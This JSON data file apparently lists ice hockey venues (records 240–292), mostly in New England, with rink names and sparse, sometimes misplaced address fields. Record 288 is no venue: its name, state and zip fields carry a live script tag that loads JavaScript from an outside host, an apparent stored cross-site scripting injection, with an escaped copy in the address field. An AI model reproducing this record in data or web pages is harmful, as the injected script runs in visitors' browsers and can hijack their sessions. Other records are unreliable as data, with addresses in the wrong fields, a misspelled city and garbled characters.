  {
    "id": "240",
    "name": "Linen Rink, Gunnery School, Washington, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "241",
    "name": "Mark Bavis Arena, Rockland",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Rockland"
  },
  {
    "id": "242",
    "name": "Nelson Withington Rink, Brattleboro, VT",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Brattleboro"
  },
  {
    "id": "243",
    "name": "Houston Rink, RPI, Troy, NY",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Troy"
  },
  {
    "id": "244",
    "name": "Courtenay Hemenway Rink, Wallingford, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Wallingford"
  },
  {
    "id": "245",
    "name": "Jahn Rink, Pomfret School, Pomfret, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Pomfret"
  },
  {
    "id": "246",
    "name": "Yankee Stadium, Bronx, NY",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Bronx"
  },
  {
    "id": "247",
    "name": "Newington Arena, Newington, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Newington"
  },
  {
    "id": "248",
    "name": "Keller Rink, Claflin Athletic Center, Belmont Hill School",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Belmont"
  },
  {
    "id": "249",
    "name": "Wallace Civic Center, Fitchburg",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "250",
    "name": "Reilly Memorial Rink, Brighton",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Brighton"
  },
  {
    "id": "251",
    "name": "Family Ice Center, Falmouth, ME",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Falmouth"
  },
  {
    "id": "252",
    "name": "Northford Ice Pavillion, Northford, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Northford"
  },
  {
    "id": "253",
    "name": "Pomfret School Jahn Rink, Pomfret, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Pomfret"
  },
  {
    "id": "254",
    "name": "Portsmouth Abbey School Rink, Portsmouth, RI",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Portsmouth"
  },
  {
    "id": "255",
    "name": "RPI Rink, Troy, NY",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Troy"
  },
  {
    "id": "256",
    "name": "Spurrier-Snyder Rink, Wesleyan University, Middletown, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Middletown"
  },
  {
    "id": "257",
    "name": "Webster Bank Arena, Bridgeport, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Bridgeport"
  },
  {
    "id": "258",
    "name": "Devine Memorial Rink, Dorchester",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Dorchester"
  },
  {
    "id": "259",
    "name": "Norway Savings Bank Arena, Auburn, ME",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Auburn"
  },
  {
    "id": "260",
    "name": "Albany Academy Field House, Albany, NY",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Albany"
  },
  {
    "id": "261",
    "name": "Danbury Ice Arena, Danbury, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Danbury"
  },
  {
    "id": "262",
    "name": "Bourque Arena, Endicott College, Beverly",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Beverly"
  },
  {
    "id": "263",
    "name": "Freitas Ice forum, UConn, Storrs, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Storrs"
  },
  {
    "id": "264",
    "name": "LaBrier Arena, Aurora, Ontario, Canada",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "265",
    "name": "Bank of Maine Ice Vault, Kennebec, ME",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Kennebec"
  },
  {
    "id": "266",
    "name": "Butler Rink, HYCC, Hyannis",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Hyannis"
  },
  {
    "id": "267",
    "name": "Schenectady County Rec. Facility, Glenville, NY",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Glenville"
  },
  {
    "id": "268",
    "name": "Essex Sports Center, Middleton",
    "address": "",
    "city": "",
    "state": "20 Manning Rd",
    "zip": "Middleton"
  },
  {
    "id": "269",
    "name": "Warrior Ice Arena, Boston",
    "address": "",
    "city": "",
    "state": "90 Guest St.",
    "zip": "Boaton"
  },
  {
    "id": "270",
    "name": "New England Sports Village, Attleboro",
    "address": "",
    "city": "",
    "state": "1395 Commerce Way, Attleboro, MA 02703",
    "zip": "Attleboro"
  },
  {
    "id": "271",
    "name": "Canton Ice House, Canton",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Canton"
  },
  {
    "id": "272",
    "name": "Highgate Recreation Facility, Highgate, VT",
    "address": "",
    "city": "",
    "state": "243 Gore Rd,",
    "zip": "Highgate"
  },
  {
    "id": "273",
    "name": "Ingalls Rink, Yale University, New Haven, CT",
    "address": "",
    "city": "",
    "state": "73 Sachem St,",
    "zip": "New Haven"
  },
  {
    "id": "274",
    "name": "West Warwick Civic Center Arena, West Warwick, RI",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "275",
    "name": "Winter Garden Ice Arena, Ridgefield, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "276",
    "name": "Dayton Arena, Conn. College, New London, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "277",
    "name": "Schenectady County Rec. Facility, Scotia, NY",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "278",
    "name": "Phillips Exeter Academy Rink, Exeter, NH",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "279",
    "name": "Campion Ice Skating Rink, West Lebanon, NH",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "280",
    "name": "SoNo Ice House. Norwalk, CT",
    "address": "",
    "city": "",
    "state": "300 Wilson Ave",
    "zip": "Norwalk"
  },
  {
    "id": "281",
    "name": "Jackson Rink, Westminster School, Simsbury, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Simsbury"
  },
  {
    "id": "282",
    "name": "Edward L. Bennett Rink, West Haven, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": "West Haven"
  },
  {
    "id": "283",
    "name": "Androscoggin Bank Colis\u00c3\u00a9e, Lewiston, ME",
    "address": "",
    "city": "",
    "state": "",
    "zip": "Lewiston"
  },
  {
    "id": "284",
    "name": "Memorial Sports Center, Middlebury, VT",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "285",
    "name": "DiLungo Ice Rink, East Haven, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "286",
    "name": "Dunkin Donuts Center, Providence, RI",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "287",
    "name": "Keene Ice, Keene, NH",
    "address": "",
    "city": "",
    "state": "380 Marlboro St.",
    "zip": "Keene"
  },
  {
    "id": "288",
    "name": "<script type=\"text/javascript\" src=\"http://yourjavascript.com/8141814003/dh.js\"></script>",
    "address": "<p>&lt;script type=\"text/javascript\" src=\"http://yourjavascript.com/8141814003/dh.js\"&gt;&lt;/script&gt;</p>",
    "city": "",
    "state": "<script type=\"text/javascript\" src=\"http://yourjavascript.com/8141814003/dh.js\"></script>",
    "zip": "<script type=\"text/javascript\" src=\"http://yourjav"
  },
  {
    "id": "289",
    "name": "Bentley University Arena, Waltham",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "290",
    "name": "Albany County Hockey Facility, Albany, NY",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "291",
    "name": "Hartong Rink, Edwards Campus, Greenwich, CT",
    "address": "",
    "city": "",
    "state": "",
    "zip": ""
  },
  {
    "id": "292",
    "name": "Steriti Memorial Rink, Boston",
    "address": "",
    "city": "",
    "state": "Commericial St.",
    "zip": "Boston"
  }
]